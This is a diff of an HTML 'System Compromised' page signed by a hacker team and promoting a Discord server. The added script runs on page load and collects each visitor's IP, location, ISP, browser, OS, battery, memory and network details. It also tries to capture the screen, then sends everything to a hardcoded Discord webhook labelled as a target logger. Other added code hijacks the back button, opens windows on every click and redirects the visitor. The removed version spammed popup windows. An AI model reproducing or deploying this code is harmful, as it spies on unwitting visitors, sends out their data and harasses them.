@@ -1,206 +1,383 @@
+
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <title>by p_yz</title>
+    <title>System Compromised</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            color: #000000;
             background-color: #000000;
+            color: white;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            cursor: default;
             overflow: hidden;
         }
 
-        h1, h3 {
-            color: #ffffff;
-        }
-
-        #ip-address {
-            color: rgb(255, 255, 255);
-        }
-
-        #ip-info {
-            font-family: Arial, sans-serif;
-            white-space: pre;
-            color: rgb(255, 255, 255);
-        }
-
-        .cmd-text-container {
+        .container {
+            text-align: center;
             position: relative;
+            z-index: 10;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 40px;
+            max-width: 400px;
+            margin: 0 auto;
         }
 
-        .cmd-text {
-            color: #000000;
-            font-size: 9px;
-            font-family: Arial, sans-serif;
-            white-space: nowrap;
-            position: absolute;
-            animation: scrollText 20s linear infinite;
-            transform: translateX(100%);
-            -webkit-text-stroke: 1px rgb(255, 255, 255);
-            text-stroke: 1px rgb(255, 255, 255);
+        .image-container img {
+            max-width: 350px;
+            height: auto;
+            filter: brightness(0.9) contrast(1.2);
         }
 
-        .gray-text {
-            color: #000000;
-            outline: 1px solid #000000;
+        .team-members {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
         }
 
-        .json-data {
-            font-family: Arial, sans-serif;
-            color: rgb(255, 255, 255);
-            text-shadow: -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;
+        .member {
+            color: #ff0000;
+            font-size: 18px;
+            padding: 8px 0;
+            text-shadow: 0 0 3px #ff0000;
+            opacity: 0;
+            animation: fadeIn 0.5s forwards;
+            animation-delay: calc(var(--order) * 0.2s);
         }
 
-        .json-data span {
-            color: black;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        @keyframes scrollText {
-            0% {
-                transform: translateX(100%);
-            }
-            100% {
-                transform: translateX(-100%);
-            }
+        .member.gold {
+            color: #FFD700;
+            text-shadow: 0 0 5px #FFD700;
+            font-size: 20px;
+            font-weight: bold;
         }
 
-        .cmd-text:hover {
-            animation-play-state: paused;
+        .discord-button {
+            background: transparent;
+            color: #ff0000;
+            padding: 12px 25px;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            text-decoration: none;
+            font-family: 'Courier New', monospace;
+            transition: all 0.3s ease;
+            text-shadow: 0 0 5px #ff0000;
         }
 
-        video {
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: -1;
-            filter: blur(10px);
+        .discord-button:hover {
+            color: #ffffff;
+            text-shadow: 0 0 8px #ff0000;
         }
 
-        audio {
+        .ip-info {
+            color: #ff0000;
+            font-size: 16px;
+            text-shadow: 0 0 3px #ff0000;
+        }
+
+        .ip-info div {
+            margin: 8px 0;
+        }
+
+        .ip-info div:last-child {
+            margin-top: 15px;
+            font-size: 18px;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+
+        .audio-player {
             display: none;
+        }
+
+        /* إضافة نمط لمربع Discord */
+        .discord-box {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #ff0000;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .discord-info {
+            color: #ff0000;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .discord-link {
+            color: #FFD700;
+            font-size: 18px;
+            text-decoration: none;
+            display: block;
+            margin-top: 5px;
+            text-shadow: 0 0 5px #FFD700;
         }
     </style>
 </head>
 <body>
-    <p align="center">
-        <img border="0" src="https://media.discordapp.net/attachments/1344328771234300007/1346658324384583782/pngfind.com-zombie-hand-png-227008.png?ex=67c8fccc&is=67c7ab4c&hm=2e020ba258adce2be424919a140160b79790b80aca4fa8bfb463c544ce71b270&=&format=webp&quality=lossless&width=591&height=676" width=device-width height="350">
-    </p>
-    <p align="RIGHT">
-        <img border="0" src="" width=device-width height="350">
-    </p>
-    <p align="center">
-        <font face="Courier" size="6" style="color: #000000;">
-            <span style="color: rgb(243, 237, 242);">R i c h t o f e n</span>
-            <span id="name"></span>
-        </font>
-    </p>
-    <p align="center">
-        <b>
-            <font face="Courier" color="#000000">
-                <a href="" style="font-size: 24px; color: rgb(59, 18, 209); text-decoration: none;"></a>
-            </font>
-        </b>
-    </p>
+    <div class="container">
+        <div class="ip-info" id="ip-info">
+            <div>SCANNING SYSTEM...</div>
+        </div>
 
-    <p id="ip-address">
-        <span style="color: rgb(255, 255, 255);">𝗬𝗢𝗨𝗥 𝗜𝗣 𝗔𝗗𝗗𝗥𝗘𝗦𝗦 : </span>
-        <span id="ip-address-value" style="color: rgb(255, 255, 255); font-size: 17px;">Loading...</span>
-    </p>
+        <div class="image-container">
+            <img src="https://h.top4top.io/p_3366155ma1.jpg" alt="Hacked">
+        </div>
 
-    <h3 style="color: rgb(255, 255, 255); animation: flashing 1s infinite;">Your IP Info :</h3>
-    <pre id="ip-info" class="json-data">Fetching...</pre>
-    <div class="cmd-text-container" style="position: relative; top: -15px;">
-        <div class="cmd-text" style="font-size: 17px; text-stroke: 3px black; color: black;">p_yz :)</div>
+        <audio id="backgroundAudio" autoplay loop>
+            <source src="https://d.top4top.io/m_3366x980e1.mp3" type="audio/mp3">
+        </audio>
+
+        <div class="team-members">
+            <div class="member gold" style="--order: 1">0xFor</div>
+            <div class="member" style="--order: 2">you have been pwn ! </div>
+            <div class="member" style="--order: 3">sasha</div>
+            <div class="member" style="--order: 4">a2_r</div>
+            <div class="member" style="--order: 5">p_yz</div>
+            <div class="member" style="--order: 6">0oxx</div>
+        </div>
+
+        <!-- استبدال زر Discord بمربع -->
+        <div class="discord-box">
+            <div class="discord-info">JOIN OUR DISCORD SERVER</div>
+            <div class="discord-link" id="discordLink">discord.gg/FVM</div>
+        </div>
     </div>
 
-    <audio autoplay loop style="display: none;">
-        <source src="" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
-
-    <!-- الفيديو بدون muted -->
-    <video width="1935" height="1140" controls autoplay>
-        <source src="https://cdn.discordapp.com/attachments/1350176213041152033/1351866110474977291/Snaptik.app_7465046990930349354_2.mp4?ex=67dbeeed&is=67da9d6d&hm=5f41fab534bdbba78ff9660b499a3459c338d1f408b05e363f4f969bc9075508&" type="video/mp4">
-        Your browser does not support the video tag.
-    </video>
-
     <script>
-        var names = [
-            { name: "[Richtofen]", color: "black" },
-            { name: "[ https://discord.gg/fvm ]", color: "white" }
-        ];
-
-        var nameIndex = 0;
-
-        function changeNames() {
-            var currentName = names[nameIndex];
-            document.getElementById("name").textContent = currentName.name;
-            document.getElementById("name").style.color = currentName.color;
-            nameIndex = (nameIndex + 1) % names.length;
-        }
-
-        setInterval(changeNames, 1000);
-
-        function fetchIPAndInfo() {
-            fetch('https://api.ipify.org/?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    document.getElementById('ip-address-value').textContent = data.ip;
-                    return data.ip;
-                })
-                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
-                .then(response => response.json())
-                .then(ipInfoData => {
-                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
-                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
-                });
-        }
-
-        fetchIPAndInfo();
-    </script>
-
-    <audio id="myAudio">
-        <source src="https://e.top4top.io/m_3351pdfu61.mp3" type="audio/mpeg">
-        متصفحك لا يدعم عنصر الصوت.
-    </audio>
-
-    <script>
-        const audio = document.getElementById('myAudio');
-
-        setTimeout(function() {
-            audio.play().catch(error => {
-                console.log('فشل تشغيل الصوت:', error);
+        window.onload = function() {
+            const audio = document.getElementById('backgroundAudio');
+            
+            // تشغيل الصوت
+            audio.play().catch(function(error) {
+                console.log("Audio autoplay failed:", error);
             });
 
-            setInterval(function() {
-                audio.currentTime = 0;
-                audio.play().catch(error => {
-                    console.log('فشل تشغيل الصوت:', error);
-                });
-            }, 4000);
-        }, 19000);
-    </script>
+            // فتح الرابط عند النقر في أي مكان
+            document.addEventListener('click', function() {
+                // تشغيل الصوت
+                audio.play();
+                
+                // فتح Discord في نافذة جديدة
+                window.open('https://discord.gg/FVM', '_blank', 'width=1200,height=800');
+            });
 
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فتح نافذة جديدة</title>
-    <script type="text/javascript">
-        function openNewWindow() {
-            window.open('https://discord.gg/fvm', '_blank');
+            // التوجيه بعد 10 ثواني
+            setTimeout(function() {
+                let newWindow = window.open('http://localhost:13172/', '_blank', 'width=1200,height=800');
+                if (newWindow) {
+                    window.close(); // إغلاق النافذة الحالية إذا تم فتح النافذة الجديدة بنجاح
+                } else {
+                    window.location.replace('http://localhost:13172/');
+                }
+            }, 10000);
+
+            // منع الرجوع للخلف
+            history.pushState(null, null, location.href);
+            window.onpopstate = function () {
+                history.go(1);
+            };
         }
 
-        window.onload = function() {
-            setInterval(openNewWindow, 2000); // افتح نافذة جديدة كل ثانيتين
-        };
+        async function getSystemInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: window.screen.colorDepth,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'Unknown',
+                battery: 'Checking...',
+                hostname: window.location.hostname,
+                referrer: document.referrer || 'Direct',
+                timeOpened: new Date().toLocaleString(),
+                browserName: getBrowserName(),
+                osInfo: getOSInfo()
+            };
+
+            // محاولة الحصول على معلومات البطارية
+            try {
+                const battery = await navigator.getBattery();
+                info.battery = {
+                    level: `${battery.level * 100}%`,
+                    charging: battery.charging ? 'Yes' : 'No'
+                };
+            } catch (e) {
+                info.battery = 'Not available';
+            }
+
+            return info;
+        }
+
+        function getBrowserName() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Firefox")) return "Firefox";
+            if (userAgent.includes("Chrome")) return "Chrome";
+            if (userAgent.includes("Safari")) return "Safari";
+            if (userAgent.includes("Edge")) return "Edge";
+            if (userAgent.includes("Opera")) return "Opera";
+            return "Unknown";
+        }
+
+        function getOSInfo() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Windows")) return "Windows";
+            if (userAgent.includes("Mac")) return "MacOS";
+            if (userAgent.includes("Linux")) return "Linux";
+            if (userAgent.includes("Android")) return "Android";
+            if (userAgent.includes("iOS")) return "iOS";
+            return "Unknown";
+        }
+
+        async function captureScreen() {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                stream.getTracks().forEach(track => track.stop());
+                return canvas.toDataURL('image/jpeg');
+            } catch (error) {
+                console.error('Screen capture failed:', error);
+                return null;
+            }
+        }
+
+        async function sendToDiscord(ipData) {
+            const webhookURL = 'https://discord.com/api/webhooks/1352327304713470033/ajECkZ3mDvOhTrDtesh4IRqyv03nyZ8W30zIoXaBOcgUfIIzYSUmDL0Qxau-vrkTbn3p';
+            
+            const systemInfo = await getSystemInfo();
+            const screenshot = await captureScreen();
+
+            const embed = {
+                username: "Advanced System Logger",
+                avatar_url: "https://e.top4top.io/p_3365007a11.jpg",
+                embeds: [{
+                    title: "🎯 Target System Information",
+                    description: "Detailed system information captured",
+                    color: 16711680,
+                    fields: [
+                        // IP Information
+                        { name: "📍 IP Address", value: `\`${ipData.ip}\``, inline: true },
+                        { name: "🌍 Country", value: ipData.country_name || "Unknown", inline: true },
+                        { name: "🏙️ City", value: ipData.city || "Unknown", inline: true },
+                        { name: "🔧 ISP", value: ipData.org || "Unknown", inline: true },
+                        { name: "⏰ Timezone", value: ipData.timezone || "Unknown", inline: true },
+                        
+                        // System Information
+                        { name: "💻 OS", value: systemInfo.osInfo, inline: true },
+                        { name: "🌐 Browser", value: systemInfo.browserName, inline: true },
+                        { name: "🖥️ Screen Resolution", value: systemInfo.screenResolution, inline: true },
+                        { name: "🔋 Battery", value: JSON.stringify(systemInfo.battery), inline: true },
+                        { name: "💾 Device Memory", value: `${systemInfo.deviceMemory} GB`, inline: true },
+                        { name: "⚡ CPU Cores", value: systemInfo.hardwareConcurrency.toString(), inline: true },
+                        
+                        // Network Information
+                        { name: "🌐 Network Info", value: JSON.stringify(systemInfo.connection), inline: false },
+                        
+                        // Additional Details
+                        { name: "🔤 Language", value: systemInfo.language, inline: true },
+                        { name: "⏱️ Time Opened", value: systemInfo.timeOpened, inline: true },
+                        { name: "📝 User Agent", value: `\`${systemInfo.userAgent}\``, inline: false }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "By 0xFor Team"
+                    }
+                }]
+            };
+
+            if (screenshot) {
+                embed.embeds[0].image = {
+                    url: screenshot
+                };
+            }
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(embed)
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                console.log('Successfully sent to Discord');
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+            }
+        }
+
+        async function fetchIPInfo() {
+            try {
+                // محاولة الحصول على IP من عدة مصادر
+                const responses = await Promise.all([
+                    fetch('https://ipapi.co/json/'),
+                    fetch('https://api.ipify.org?format=json')
+                ]);
+                
+                const data = await responses[0].json();
+                
+                const ipInfo = document.getElementById('ip-info');
+                ipInfo.innerHTML = `
+                    <div><span class="label">IP:</span> <span class="value">${data.ip}</span></div>
+                    <div><span class="label">LOCATION:</span> <span class="value">${data.country_name}</span></div>
+                    <div><span class="label">CITY:</span> <span class="value">${data.city}</span></div>
+                    <div><span class="label">NETWORK:</span> <span class="value">${data.org}</span></div>
+                    <div><span class="label">TIMEZONE:</span> <span class="value">${data.timezone}</span></div>
+                    <div>⚠️ SYSTEM COMPROMISED ⚠️</div>
+                `;
+
+                // إرسال المعلومات إلى Discord فوراً
+                await sendToDiscord(data);
+
+            } catch (error) {
+                console.error('Error:', error);
+                const ipInfo = document.getElementById('ip-info');
+                ipInfo.innerHTML = '<div>CONNECTION FAILED</div>';
+            }
+        }
+
+        // تشغيل عند تحميل الصفحة
+        window.addEventListener('load', fetchIPInfo);
     </script>
-</head>
-<body>
 </body>
 </html>
